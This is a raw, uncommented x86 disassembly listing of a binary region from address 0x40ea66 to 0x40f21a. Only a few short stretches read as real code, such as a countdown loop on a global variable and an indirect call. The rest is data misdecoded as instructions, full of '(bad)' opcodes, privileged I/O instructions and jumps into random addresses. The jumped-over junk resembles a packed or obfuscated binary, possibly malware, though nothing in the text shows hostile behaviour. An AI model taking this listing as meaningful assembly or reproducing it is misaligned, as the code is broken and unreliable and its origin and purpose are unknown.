  40ea66:	rcr    cl,cl
  40ea68:	sahf   
  40ea69:	lds    esi,FWORD PTR [edi-0xfb190fe]
  40ea6f:	xchg   ebp,eax
  40ea70:	adc    DWORD PTR [esi-0x549804af],eax
  40ea76:	scas   al,BYTE PTR es:[edi]
  40ea77:	lahf   
  40ea78:	stc    
  40ea79:	pop    es
  40ea7a:	and    DWORD PTR [edx+ebx*2+0x37608761],0xffffffb4
  40ea82:	mov    al,dh
  40ea84:	xchg   DWORD PTR [ecx+ebx*8-0x1066247e],ecx
  40ea8b:	arpl   WORD PTR [ebx+0x31],cx
  40ea8e:	retf   
  40ea8f:	mov    al,0x3e
  40ea91:	shl    BYTE PTR [edi+0x16],1
  40ea94:	call   0x70e7:0xf38cfd54
  40ea9b:	into   
  40ea9c:	add    al,0xf1
  40ea9e:	jp     0x40ea7b
  40eaa0:	out    dx,al
  40eaa1:	ds jne 0x40eb4e
  40eaa8:	add    ecx,edx
  40eaaa:	mov    eax,DWORD PTR [ebp+0x8]
  40eaad:	sbb    ecx,0x443c
  40eab3:	mov    ecx,DWORD PTR [ebp-0x10]
  40eab6:	adc    edx,DWORD PTR ds:0x42fd65
  40eabc:	xor    eax,esi
  40eabe:	add    eax,edi
  40eac0:	mov    DWORD PTR [ecx],eax
  40eac2:	sbb    ecx,0x77dc
  40eac8:	mov    eax,DWORD PTR [ebp-0x10]
  40eacb:	adc    ecx,0x4d7b
  40ead1:	mov    ecx,DWORD PTR [ebp-0x14]
  40ead4:	mov    DWORD PTR ds:0x42e1a8,0x11
  40eade:	cmp    DWORD PTR ds:0x42e1a8,0x0
  40eae5:	je     0x40eb43
  40eaeb:	cmp    DWORD PTR ds:0x42e1a8,0x2
  40eaf2:	jne    0x40eb15
  40eaf8:	push   0x42e1b0
  40eafd:	push   0x42e1ef
  40eb02:	push   0x1c20
  40eb07:	push   DWORD PTR [ebp-0x10]
  40eb0a:	push   0x848e
  40eb0f:	call   DWORD PTR ds:0x42e38f
  40eb15:	cmp    DWORD PTR ds:0x42e1a8,0x3
  40eb1c:	jne    0x40eb31
  40eb22:	xor    edx,edx
  40eb24:	or     edx,DWORD PTR ds:0x42e1a8
  40eb2a:	dec    edx
  40eb2b:	mov    DWORD PTR ds:0x42e1a8,edx
  40eb31:	mov    edx,DWORD PTR ds:0x42e1a8
  40eb37:	dec    edx
  40eb38:	mov    DWORD PTR ds:0x42e1a8,edx
  40eb3e:	jmp    0x40eade
  40eb43:	xor    ecx,esi
  40eb45:	mov    edx,0xffcd8d64
  40eb4a:	sub    edx,ecx
  40eb4c:	add    DWORD PTR [eax],edx
  40eb4e:	mov    eax,ds:0x41b27c
  40eb53:	mov    eax,DWORD PTR [eax]
  40eb55:	mov    cx,WORD PTR [ebp-0x4]
  40eb59:	movzx  ecx,cx
  40eb5c:	add    ecx,DWORD PTR [eax]
  40eb5e:	mov    DWORD PTR [ebp-0x1c],ecx
  40eb61:	mov    eax,DWORD PTR [ebp+0xc]
  40eb64:	mov    ecx,DWORD PTR [ebp+0xc]
  40eb67:	xor    eax,esi
  40eb69:	lea    eax,[eax+eax*1+0x32729c]
  40eb70:	xor    ecx,esi
  40eb72:	sub    ecx,eax
  40eb74:	mov    ax,WORD PTR [ebp-0x4]
  40eb78:	movzx  eax,ax
  40eb7b:	jmp    0x40ece5
  40eb80:	or     BYTE PTR [edi],dl
  40eb82:	shr    BYTE PTR [edx-0x31],0x71
  40eb86:	mov    dl,0x71
  40eb88:	inc    eax
  40eb89:	(bad)  
  40eb8a:	pop    esp
  40eb8b:	mov    ch,0x30
  40eb8d:	push   0xaff79ef1
  40eb92:	jo     0x40ec04
  40eb94:	ret    
  40eb95:	jg     0x40ec07
  40eb97:	jo     0x40ebda
  40eb99:	loope  0x40ebcd
  40eb9b:	fistp  DWORD PTR [esi]
  40eb9d:	and    edx,DWORD PTR [eax-0x49089bf0]
  40eba3:	enter  0xa0ea,0xb6
  40eba7:	call   0x28e4:0x5779c6c6
  40ebae:	cdq    
  40ebaf:	scas   eax,DWORD PTR es:[edi]
  40ebb0:	jno    0x40ebe4
  40ebb2:	shl    BYTE PTR [esi+0x29],1
  40ebb5:	push   cs
  40ebb6:	lds    edx,FWORD PTR [edi-0x4d]
  40ebb9:	xchg   ebp,eax
  40ebba:	mov    esp,0x8373636a
  40ebbf:	add    edx,DWORD PTR [edi]
  40ebc1:	enter  0xf890,0xcc
  40ebc5:	sahf   
  40ebc6:	pop    ss
  40ebc7:	xchg   ecx,eax
  40ebc8:	ficom  DWORD PTR [eax]
  40ebca:	inc    DWORD PTR [ecx-0x270e71d]
  40ebd0:	jg     0x40eb82
  40ebd2:	dec    esp
  40ebd3:	dec    esp
  40ebd4:	inc    ecx
  40ebd5:	jnp    0x40ec39
  40ebd7:	out    dx,al
  40ebd8:	mov    bl,0x0
  40ebda:	xchg   esi,eax
  40ebdb:	aam    0x6b
  40ebdd:	rol    DWORD PTR ds:0x36ec1afd,0x22
  40ebe4:	fs fdivr st(4),st
  40ebe7:	mov    ebx,ebx
  40ebe9:	ficomp DWORD PTR [edx]
  40ebeb:	jae    0x40ec3c
  40ebed:	lock hlt 
  40ebef:	jno    0x40eb80
  40ebf1:	xchg   edx,eax
  40ebf2:	mov    edx,0xef3f148c
  40ebf7:	les    ecx,FWORD PTR [ebp+0x7c17b9a7]
  40ebfd:	sahf   
  40ebfe:	dec    edx
  40ebff:	add    al,bh
  40ec01:	iret   
  40ec02:	sub    ah,dl
  40ec04:	adc    eax,0x8d6c53ea
  40ec09:	and    ch,BYTE PTR ds:0x140863e8
  40ec0f:	lahf   
  40ec10:	inc    DWORD PTR [eax+0x3f]
  40ec13:	jae    0x40ec5d
  40ec15:	(bad)  
  40ec16:	test   eax,0xbb3c50df
  40ec1b:	ret    0x368a
  40ec1e:	call   0x93d08519
  40ec23:	out    0x86,al
  40ec25:	jecxz  0x40ec87
  40ec27:	aam    0xc6
  40ec29:	pop    ebx
  40ec2a:	shl    DWORD PTR [ebp+eax*4+0x42],1
  40ec2e:	and    eax,0x2c271d41
  40ec33:	outs   dx,DWORD PTR ds:[esi]
  40ec34:	sbb    al,0x24
  40ec36:	pop    ecx
  40ec37:	pop    ss
  40ec38:	add    ah,dl
  40ec3a:	push   0x1191fe78
  40ec3f:	loop   0x40ec91
  40ec41:	add    eax,edi
  40ec43:	inc    esi
  40ec44:	bound  ebp,QWORD PTR [esi]
  40ec46:	test   eax,0xd38663d4
  40ec4b:	cdq    
  40ec4c:	ds iret 
  40ec4e:	test   eax,0x88b23a8e
  40ec53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec54:	sbb    eax,0x672a7c6a
  40ec59:	mov    bh,0x8e
  40ec5b:	imul   ecx,DWORD PTR [esi+0x24],0x5eba2657
  40ec62:	cli    
  40ec63:	mov    eax,0xe0639327
  40ec68:	sub    BYTE PTR [ebx-0x4],bl
  40ec6b:	call   0xf7b3:0xc60e0529
  40ec72:	dec    eax
  40ec73:	outs   dx,DWORD PTR ds:[esi]
  40ec74:	inc    ebx
  40ec75:	xchg   DWORD PTR [ebp-0x8a315a],ebp
  40ec7b:	out    0x5b,eax
  40ec7d:	shl    BYTE PTR [ebx-0x41],cl
  40ec80:	repz mov ds:0x11180ffd,al
  40ec86:	test   DWORD PTR [edx-0x731de838],esp
  40ec8c:	iret   
  40ec8d:	ja     0x40ecff
  40ec8f:	test   BYTE PTR [ebp+0x67f377e4],bl
  40ec95:	add    al,al
  40ec97:	daa    
  40ec98:	xor    BYTE PTR [edi+0x51],ah
  40ec9b:	jno    0x40ec72
  40ec9d:	xchg   edx,eax
  40ec9e:	(bad)  
  40ec9f:	fst    QWORD PTR [edi+0x36dad1be]
  40eca5:	cmp    dl,al
  40eca7:	mov    edx,0xca133337
  40ecac:	cmp    ebx,0xce04a10b
  40ecb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ecb3:	nop    DWORD PTR [eax-0x41]
  40ecb7:	mov    al,0x75
  40ecb9:	mov    edi,0x7a12587b
  40ecbe:	push   0xf499e7ff
  40ecc3:	sbb    al,ah
  40ecc5:	shl    DWORD PTR [ecx+0x4e],0x9
  40ecc9:	lds    edx,FWORD PTR [eax-0x2a2ba352]
  40eccf:	pop    es
  40ecd0:	push   0xa558c38f
  40ecd5:	lods   al,BYTE PTR ds:[esi]
  40ecd6:	leave  
  40ecd7:	ret    0x2fd4
  40ecda:	bound  esi,QWORD PTR [edi]
  40ecdc:	mov    edi,0xcfd223e1
  40ece1:	mov    cl,0x5d
  40ece3:	repnz les edi,FWORD PTR [ebx]
  40ece6:	ror    DWORD PTR [ebx-0x48f013bb],0x4d
  40eced:	cld    
  40ecee:	jmp    0x40ee58
  40ecf3:	movntps XMMWORD PTR [edi+edi*8+0x64],xmm4
  40ecf8:	push   edi
  40ecf9:	rep stos DWORD PTR es:[edi],eax
  40ecfb:	mov    dh,0x81
  40ecfd:	push   ebx
  40ecfe:	jle    0x40ecdc
  40ed00:	hlt    
  40ed01:	mov    ds:0x70aeba50,al
  40ed06:	jo     0x40eccb
  40ed08:	jg     0x40ed7a
  40ed0a:	jo     0x40ed07
  40ed0c:	bound  ecx,QWORD PTR [ecx+0x396d2ca1]
  40ed12:	retf   
  40ed13:	(bad)  
  40ed14:	mov    cl,0xa2
  40ed16:	das    
  40ed17:	fnstcw WORD PTR [esi+0x55]
  40ed1a:	mov    DWORD PTR [esi+ebp*2-0x63969a56],ebp
  40ed21:	test   DWORD PTR [eax],edi
  40ed23:	xchg   edx,eax
  40ed24:	outs   dx,BYTE PTR ds:[esi]
  40ed25:	adc    eax,0x968e889b
  40ed2a:	jnp    0x40ed50
  40ed2c:	and    al,0x42
  40ed2e:	add    dl,ch
  40ed30:	gs jne 0x40eda6
  40ed33:	mov    dl,0x82
  40ed35:	cmp    al,dh
  40ed37:	fadd   st(2),st
  40ed39:	sub    esp,esi
  40ed3b:	xchg   ebp,eax
  40ed3c:	in     eax,0xa6
  40ed3e:	lahf   
  40ed3f:	add    DWORD PTR [edx-0x487cd60],ebx
  40ed45:	adc    dh,dh
  40ed47:	mov    DWORD PTR [edx],ebp
  40ed49:	adc    al,0x6b
  40ed4b:	pop    edi
  40ed4c:	(bad)  [esi-0x74]
  40ed4f:	dec    edx
  40ed50:	and    BYTE PTR [ecx-0x3b],bh
  40ed53:	push   0x61
  40ed55:	xor    BYTE PTR fs:[ebx-0xb05b4dc],ch
  40ed5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed5d:	cmp    DWORD PTR [ecx],eax
  40ed5f:	lods   al,BYTE PTR ds:[esi]
  40ed60:	jge    0x40ed51
  40ed62:	add    ah,ah
  40ed64:	sbb    BYTE PTR [edx-0x5993f66a],cl
  40ed6a:	mov    ds:0xb1e60bf,al
  40ed6f:	pop    es
  40ed70:	mov    ebx,0x7ee96f9d
  40ed75:	fsub   st,st(2)
  40ed77:	jmp    0x85fd2472
  40ed7c:	pop    ebx
  40ed7d:	sub    BYTE PTR [ebx+0x1da15ad2],bl
  40ed83:	adc    esi,ecx
  40ed85:	xor    ah,BYTE PTR ds:0xaffc7be1
  40ed8b:	daa    
  40ed8c:	mov    bh,0x8d
  40ed8e:	out    0x65,eax
  40ed90:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40ed92:	cmp    al,0x37
  40ed94:	dec    ebp
  40ed95:	or     al,0xf1
  40ed97:	fld    DWORD PTR [ebp-0x45]
  40ed9a:	mov    edx,0x5084339f
  40ed9f:	not    dh
  40eda1:	adc    eax,0xeff67798
  40eda6:	pop    edx
  40eda7:	dec    ebp
  40eda8:	(bad)  
  40edaa:	mov    ecx,0x7dbb9a32
  40edaf:	lock in eax,dx
  40edb1:	lods   al,BYTE PTR ds:[esi]
  40edb2:	sub    dl,0x46
  40edb5:	add    ah,BYTE PTR [esi+0x3ee4c73e]
  40edbb:	in     al,0x4f
  40edbd:	leave  
  40edbe:	inc    DWORD PTR [edi-0x24ba1a7d]
  40edc4:	mov    ebx,0xd54791d3
  40edc9:	outs   dx,DWORD PTR ds:[esi]
  40edca:	xchg   eax,esp
  40edcc:	into   
  40edcd:	push   ecx
  40edce:	neg    BYTE PTR [ecx+edi*4+0x6e]
  40edd2:	inc    ah
  40edd4:	rol    BYTE PTR [edi],1
  40edd6:	fdivr  QWORD PTR ds:[ebx]
  40edd9:	cmp    BYTE PTR [edx],ch
  40eddb:	pusha  
  40eddc:	sub    edx,0xd8cfdd2d
  40ede2:	mov    edi,0xa9e18115
  40ede7:	jmp    0xad4a8f2c
  40edec:	inc    edi
  40eded:	dec    DWORD PTR [eax]
  40edef:	dec    ecx
  40edf0:	dec    esi
  40edf1:	jb     0x40ee54
  40edf3:	(bad)  
  40edf4:	xor    eax,0xa22dd5e6
  40edf9:	push   esi
  40edfa:	nop
  40edfb:	out    0xb7,eax
  40edfd:	mov    ebx,0xd6b14ac2
  40ee02:	lock xor cl,BYTE PTR [edx]
  40ee05:	pop    ecx
  40ee06:	inc    edi
  40ee07:	and    al,bh
  40ee09:	in     eax,dx
  40ee0a:	inc    ebx
  40ee0b:	and    BYTE PTR [ecx],ch
  40ee0d:	mov    al,ds:0x14872aa7
  40ee12:	adc    ebp,DWORD PTR [edi-0x70d4d61d]
  40ee18:	inc    ebx
  40ee19:	outs   dx,BYTE PTR ds:[esi]
  40ee1a:	add    ebx,ebp
  40ee1c:	in     eax,dx
  40ee1d:	jnp    0x40ee9b
  40ee1f:	dec    esi
  40ee20:	mov    esp,0x24fb376
  40ee25:	jecxz  0x40edde
  40ee27:	mov    ebp,0xf3defc7c
  40ee2c:	pop    es
  40ee2d:	add    BYTE PTR [esi],dl
  40ee2f:	retf   0x456e
  40ee32:	or     esp,DWORD PTR [edi-0xc]
  40ee35:	mov    ds,WORD PTR [esi+0x30163942]
  40ee3b:	stos   DWORD PTR es:[edi],eax
  40ee3c:	lods   eax,DWORD PTR ds:[esi]
  40ee3d:	mov    cl,0xd
  40ee3f:	xor    BYTE PTR [edx],bl
  40ee41:	cmp    DWORD PTR [ebp-0x3e],edx
  40ee44:	mov    ds:0x408305,al
  40ee49:	mov    dh,0xba
  40ee4b:	mov    dh,0xe
  40ee4d:	in     al,0xd8
  40ee4f:	sbb    edx,DWORD PTR [edi-0x13]
  40ee52:	and    ecx,ebp
  40ee54:	push   ebp
  40ee55:	popf   
  40ee56:	mov    ebp,0x798f0f01
  40ee5b:	add    DWORD PTR [eax],eax
  40ee5d:	add    BYTE PTR [ebx],dh
  40ee5f:	(bad)  
  40ee60:	sub    ecx,eax
  40ee62:	sub    ecx,edi
  40ee64:	mov    WORD PTR [ebp-0x4],cx
  40ee68:	jmp    0x40efe4
  40ee6d:	jmp    0x40efd7
  40ee72:	int3   
  40ee73:	push   ebp
  40ee74:	(bad)  
  40ee75:	icebp  
  40ee76:	xchg   ecx,eax
  40ee77:	icebp  
  40ee78:	je     0x40eeef
  40ee7a:	in     al,0x65
  40ee7c:	pop    edx
  40ee7d:	mov    cl,0xc0
  40ee7f:	pop    esp
  40ee80:	dec    edx
  40ee81:	pop    esp
  40ee82:	or     eax,0xc37070ac
  40ee87:	jg     0x40eef9
  40ee89:	jo     0x40ee8b
  40ee8b:	pop    ebx
  40ee8c:	push   0xffffff85
  40ee8e:	jmp    0x40eeae
  40ee90:	push   0x7ea6790
  40ee95:	xchg   ebp,eax
  40ee96:	dec    ecx
  40ee97:	sbb    DWORD PTR [esi-0x53],edx
  40ee9a:	hlt    
  40ee9b:	or     al,0x3b
  40ee9d:	test   DWORD PTR cs:[ebp+0x1f],edx
  40eea1:	xchg   ecx,eax
  40eea2:	aas    
  40eea3:	fmulp  st(2),st
  40eea5:	cli    
  40eea6:	nop
  40eea7:	sub    edx,edx
  40eea9:	test   al,0xc1
  40eeab:	xchg   ebp,eax
  40eeac:	inc    esi
  40eead:	add    BYTE PTR [edi],ah
  40eeaf:	mov    ebp,0x454203a5
  40eeb4:	daa    
  40eeb5:	mov    es,WORD PTR [esi-0x5e]
  40eeb8:	out    dx,al
  40eeb9:	mov    ds:0xa2347cce,eax
  40eebe:	sahf   
  40eebf:	ja     0x40eedd
  40eec1:	ret    0x1c32
  40eec4:	mov    dh,0x1f
  40eec6:	loop   0x40eeb5
  40eec8:	call   0xa222cb9c
  40eecd:	add    esi,DWORD PTR [esi]
  40eecf:	dec    ebx
  40eed0:	int    0xae
  40eed2:	pop    edx
  40eed3:	(bad)  
  40eed4:	adc    DWORD PTR ds:[edx-0x1],edx
  40eed8:	mov    bh,0x5a
  40eeda:	pop    esp
  40eedb:	cs lahf 
  40eedd:	out    dx,al
  40eede:	jne    0x40ee95
  40eee0:	mov    BYTE PTR [esi-0x5975d273],cl
  40eee6:	xchg   esp,eax
  40eee7:	push   ss
  40eee8:	inc    esi
  40eee9:	xor    eax,0xa24452c6
  40eeef:	mov    cl,0x62
  40eef1:	ret    
  40eef2:	sub    edi,DWORD PTR [eax]
  40eef4:	neg    DWORD PTR [esi]
  40eef6:	xchg   BYTE PTR [edi+0x4b],dh
  40eef9:	jbe    0x40ee8a
  40eefb:	push   ds
  40eefc:	cdq    
  40eefd:	and    al,0xff
  40eeff:	jl     0x40ee87
  40ef01:	add    BYTE PTR [ecx],ah
  40ef03:	test   eax,0xa08de641
  40ef08:	fild   QWORD PTR [ebx+ecx*4+0x4e]
  40ef0c:	aad    0x2e
  40ef0e:	cmp    esp,ebp
  40ef10:	test   al,0xb
  40ef12:	xor    BYTE PTR [eax],ah
  40ef14:	inc    edx
  40ef15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef16:	retf   0xb605
  40ef19:	cld    
  40ef1a:	es mov bh,0xd6
  40ef1d:	lds    esi,FWORD PTR cs:[edx]
  40ef20:	ror    DWORD PTR [eax-0xa12cc25],0x34
  40ef27:	mov    ds:0x11ec3725,eax
  40ef2c:	sub    ecx,DWORD PTR [ebx-0x70c08bd5]
  40ef32:	xchg   esi,eax
  40ef33:	fld    DWORD PTR [ebx]
  40ef35:	lahf   
  40ef36:	sbb    al,0xd5
  40ef38:	pushf  
  40ef39:	(bad)  
  40ef3a:	pushf  
  40ef3b:	xchg   ebp,eax
  40ef3c:	dec    eax
  40ef3d:	mov    BYTE PTR [edi-0x32],bh
  40ef40:	iret   
  40ef41:	enter  0x1e95,0x69
  40ef45:	in     al,dx
  40ef46:	cmp    bl,ah
  40ef48:	dec    edi
  40ef49:	and    edx,esi
  40ef4b:	cmp    edx,DWORD PTR [ebp+0xb03febc]
  40ef51:	add    BYTE PTR [ebp-0x5a],dh
  40ef54:	imul   ebp,DWORD PTR [edx+esi*1+0x19aa6fa7],0x3e76b298
  40ef5f:	mov    bh,0xcd
  40ef61:	mov    al,0x9b
  40ef63:	shl    DWORD PTR [esi+0x6f2f9915],cl
  40ef69:	xor    al,0x46
  40ef6b:	sub    eax,0xb0e658c0
  40ef70:	sub    al,0x24
  40ef72:	sbb    dh,BYTE PTR [edi-0x61d4e887]
  40ef78:	push   0x8207470
  40ef7d:	into   
  40ef7e:	aad    0x56
  40ef80:	mov    WORD PTR [eax+ebx*8+0x7e14a321],fs
  40ef87:	add    al,0x8b
  40ef89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef8a:	mov    esp,0x45720dbf
  40ef8f:	cdq    
  40ef90:	inc    esp
  40ef91:	mov    dl,0xc8
  40ef93:	push   0x3fc2dc7c
  40ef98:	cmp    DWORD PTR [ecx-0x41],0xffffff9a
  40ef9c:	pop    ebx
  40ef9d:	scas   eax,DWORD PTR es:[edi]
  40ef9e:	test   eax,0x10219d4b
  40efa3:	inc    esp
  40efa4:	jne    0x40ef3e
  40efa6:	ins    DWORD PTR es:[edi],dx
  40efa7:	jno    0x40ef97
  40efa9:	push   esi
  40efaa:	cli    
  40efab:	push   edi
  40efac:	aad    0xd2
  40efae:	inc    edx
  40efaf:	cmp    BYTE PTR [edx+edx*4+0x8],cl
  40efb3:	repnz popf 
  40efb5:	cmp    eax,DWORD PTR [eax+0xe]
  40efb8:	pop    edx
  40efb9:	ror    DWORD PTR ds:0x248994ba,cl
  40efbf:	add    al,0x95
  40efc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40efc2:	xchg   ebp,eax
  40efc3:	mov    ds:0x228ebae9,eax
  40efc8:	out    0xb9,eax
  40efca:	jnp    0x40ef78
  40efcc:	hlt    
  40efcd:	adc    edx,ecx
  40efcf:	in     eax,0xfc
  40efd1:	imul   ebx,DWORD PTR [eax+0xec26371],0x33
  40efd8:	(bad)  
  40efd9:	lea    eax,[eax+ecx*1+0x32729c]
  40efe0:	mov    WORD PTR [ebp-0x4],ax
  40efe4:	mov    eax,DWORD PTR [ebp-0xc]
  40efe7:	cmp    eax,ebx
  40efe9:	jmp    0x40f153
  40efee:	mov    cs,WORD PTR [ebx]
  40eff0:	enter  0x51c7,0xc3
  40eff4:	lea    edx,[ecx+0x2a]
  40eff7:	leave  
  40eff8:	inc    esi
  40eff9:	inc    ebx
  40effa:	jmp    0x40f05f
  40effc:	and    DWORD PTR [edx+0x7070abd0],ebp
  40f002:	ret    
  40f003:	jg     0x40f075
  40f005:	jo     0x40f009
  40f007:	hlt    
  40f008:	int    0xcb
  40f00a:	das    
  40f00b:	jl     0x40f003
  40f00d:	pop    ss
  40f00e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f00f:	mov    dh,cl
  40f011:	xor    al,BYTE PTR [eax+0x4a0205b0]
  40f017:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f018:	mov    esp,0x98725b07
  40f01d:	dec    esi
  40f01e:	cmp    al,0x56
  40f020:	loopne 0x40f093
  40f022:	cmp    eax,0x9a79ed9f
  40f027:	sahf   
  40f028:	out    dx,al
  40f029:	std    
  40f02a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f02b:	jmp    0x28853651
  40f030:	mov    ah,0x5d
  40f032:	cmp    WORD PTR [esi-0x10],0x507b
  40f038:	cmp    BYTE PTR ds:0xe72faf59,ch
  40f03e:	xchg   DWORD PTR [eax],edx
  40f040:	leave  
  40f041:	into   
  40f042:	dec    esi
  40f043:	mov    edx,DWORD PTR [esi]
  40f045:	push   ebx
  40f046:	imul   BYTE PTR [ebx-0x1015fe19]
  40f04c:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40f04e:	dec    ebx
  40f04f:	inc    esp
  40f050:	mov    esi,0x6ddcda18
  40f055:	push   es
  40f056:	out    dx,al
  40f057:	push   0xfffffffb
  40f059:	sti    
  40f05a:	mov    edx,0x806aff93
  40f05f:	in     al,dx
  40f060:	push   esi
  40f061:	in     eax,dx
  40f062:	out    0x0,al
  40f064:	(bad)  
  40f065:	repnz sub bh,bh
  40f068:	jecxz  0x40f00f
  40f06a:	jmp    0xc53534c2
  40f06f:	jnp    0x40f017
  40f071:	int    0x20
  40f073:	outs   dx,BYTE PTR ds:[esi]
  40f074:	retf   
  40f075:	out    dx,al
  40f076:	int3   
  40f077:	arpl   WORD PTR [edi+0x473a3444],dx
  40f07d:	push   ebx
  40f07e:	inc    eax
  40f07f:	mov    ecx,0xd728f599
  40f084:	cmp    al,0x7a
  40f086:	sub    dh,BYTE PTR [ebp+0x5ba43f89]
  40f08c:	push   ss
  40f08d:	jns    0x40f0e6
  40f08f:	outs   dx,BYTE PTR ds:[esi]
  40f090:	jge    0x40f101
  40f092:	add    ecx,esp
  40f094:	adc    edx,DWORD PTR [esi+esi*8+0x58b10d8]
  40f09b:	xchg   BYTE PTR [esi+0x73],cl
  40f09e:	mov    bh,BYTE PTR [eax]
  40f0a0:	inc    ebp
  40f0a1:	xchg   edi,eax
  40f0a2:	pop    ebx
  40f0a3:	xor    edi,DWORD PTR [ebx+0x48]
  40f0a6:	sbb    DWORD PTR [esi+0x506c0d38],esi
  40f0ac:	outs   dx,DWORD PTR ds:[esi]
  40f0ad:	mov    al,0x94
  40f0af:	adc    cl,dl
  40f0b1:	jecxz  0x40f0d6
  40f0b3:	or     eax,0x3c651638
  40f0b8:	inc    edx
  40f0b9:	sbb    esi,DWORD PTR [esi]
  40f0bb:	sbb    al,0x17
  40f0bd:	push   ss
  40f0be:	rcr    BYTE PTR [ebx-0x9],0x9b
  40f0c2:	in     al,dx
  40f0c3:	mov    esp,DWORD PTR es:[edx-0x5d]
  40f0c7:	or     dl,BYTE PTR [edi-0x29]
  40f0ca:	ret    0xfdbe
  40f0cd:	mov    al,ds:0xac8cdf4d
  40f0d2:	mov    esi,0x935d05e
  40f0d7:	sbb    ecx,DWORD PTR [edi+0x0]
  40f0da:	ret    
  40f0db:	sbb    bl,BYTE PTR [edx]
  40f0dd:	aas    
  40f0de:	or     BYTE PTR [esi],ah
  40f0e0:	and    dl,ch
  40f0e2:	ficom  DWORD PTR [eax-0x7135de40]
  40f0e8:	inc    edx
  40f0e9:	add    cl,BYTE PTR [eax+0x7674926a]
  40f0ef:	sub    eax,0x1c690e40
  40f0f4:	out    dx,al
  40f0f5:	call   0xd292:0x6fd48a9c
  40f0fc:	sbb    BYTE PTR [esi-0x355d7d6d],ah
  40f102:	ins    DWORD PTR es:[edi],dx
  40f103:	fld    DWORD PTR [eax]
  40f105:	push   ds
  40f106:	xor    ch,bl
  40f108:	mov    eax,ds:0xb401e01e
  40f10d:	retf   0x46b5
  40f110:	popf   
  40f111:	push   ebx
  40f112:	(bad)  
  40f113:	hlt    
  40f114:	dec    ebp
  40f115:	out    dx,al
  40f116:	(bad)  
  40f117:	jns    0x40f166
  40f119:	(bad)  
  40f11a:	out    0xa5,al
  40f11c:	call   0x459e:0x40fc9003
  40f123:	add    dl,cl
  40f125:	bound  edi,QWORD PTR [eax+0x22]
  40f128:	add    dh,al
  40f12a:	jecxz  0x40f0db
  40f12c:	adc    eax,0x922f6fc9
  40f131:	push   edi
  40f132:	stos   DWORD PTR es:[edi],eax
  40f133:	jp     0x40f0df
  40f135:	out    dx,eax
  40f136:	data16 fbstp TBYTE PTR [ecx]
  40f139:	jne    0x40f154
  40f13b:	int    0x1f
  40f13d:	ret    0xf422
  40f140:	jp     0x40f156
  40f142:	ds jmp 0x9b8a81b
  40f148:	ror    BYTE PTR [edi+0x43],1
  40f14b:	pusha  
  40f14c:	scas   al,BYTE PTR es:[edi]
  40f14d:	fcmovbe st,st(3)
  40f14f:	or     eax,0xf792195
  40f154:	test   BYTE PTR [eax+0x1],bh
  40f157:	add    BYTE PTR [eax],al
  40f159:	mov    eax,DWORD PTR [ebp-0x8]
  40f15c:	jmp    0x40f2c6
  40f161:	lods   eax,DWORD PTR ds:[esi]
  40f162:	ret    0xcc29
  40f165:	jno    0x40f15a
  40f167:	ins    DWORD PTR es:[edi],dx
  40f168:	popa   
  40f169:	fdivr  DWORD PTR [ecx]
  40f16b:	xchg   ecx,eax
  40f16c:	test   DWORD PTR [esi+0xb],ebx
  40f16f:	jl     0x40f1ad
  40f171:	mov    ds:0xc37070aa,eax
  40f176:	jg     0x40f1e8
  40f178:	jo     0x40f1a2
  40f17a:	push   ecx
  40f17b:	inc    ecx
  40f17c:	jo     0x40f1db
  40f17e:	shl    edx,cl
  40f180:	mul    DWORD PTR [eax-0x230e2d3c]
  40f186:	or     al,0xc5
  40f188:	push   0x3e
  40f18a:	arpl   WORD PTR [ebp+ecx*1-0x10b44c7a],ax
  40f191:	sub    DWORD PTR [ebx-0x49],edx
  40f194:	test   eax,0xa24aab7d
  40f199:	icebp  
  40f19a:	int3   
  40f19b:	mov    ebp,0x3f4026c
  40f1a0:	cdq    
  40f1a1:	push   eax
  40f1a2:	repnz mov bh,0xdd
  40f1a5:	xor    ebx,DWORD PTR [edx-0x5c]
  40f1a8:	leave  
  40f1a9:	inc    esp
  40f1aa:	cld    
  40f1ab:	das    
  40f1ac:	dec    ecx
  40f1ad:	data16 fmul st(5),st
  40f1b0:	xor    bh,0x68
  40f1b3:	cmp    esp,DWORD PTR [ebp+eax*4+0x11]
  40f1b7:	ret    
  40f1b8:	and    DWORD PTR [eax+0x7547dba9],ecx
  40f1be:	int3   
  40f1bf:	jl     0x40f162
  40f1c1:	xchg   ecx,eax
  40f1c2:	mov    DWORD PTR [esi-0x25],esp
  40f1c5:	mov    al,dl
  40f1c7:	test   BYTE PTR [edi+0x53],0x37
  40f1cb:	mov    BYTE PTR [ebp+0x17],ch
  40f1ce:	or     BYTE PTR [ecx-0x1c],bh
  40f1d1:	pop    ebp
  40f1d2:	ja     0x40f1e4
  40f1d4:	sbb    DWORD PTR gs:[ecx-0x17263df4],edi
  40f1db:	lahf   
  40f1dc:	mov    ds:0x17f54594,al
  40f1e1:	xor    DWORD PTR [ebp+0x15],ebx
  40f1e4:	pop    es
  40f1e5:	repnz xlat BYTE PTR ds:[ebx]
  40f1e7:	js     0x40f1ab
  40f1e9:	push   0x15
  40f1eb:	or     bl,ch
  40f1ed:	retf   
  40f1ee:	repnz pop ebx
  40f1f0:	fs adc eax,0xb80eba93
  40f1f6:	jno    0x40f194
  40f1f8:	rcl    DWORD PTR [ecx+eiz*4-0x5b],0xed
  40f1fd:	(bad)  
  40f1fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1ff:	pop    esp
  40f200:	inc    esp
  40f201:	sub    esi,0x58e34160
  40f207:	lods   eax,DWORD PTR ds:[esi]
  40f208:	test   DWORD PTR ds:[esp+edx*2],edi
  40f20c:	add    eax,DWORD PTR [ebx-0x37]
  40f20f:	fcmovnb st,st(6)
  40f211:	dec    edx
  40f212:	fidivr DWORD PTR [edx+0xd]
  40f215:	inc    ebx
  40f216:	fimul  DWORD PTR [ecx+0x15]
  40f219:	cwde   
  40f21a:	xor    ch,bh
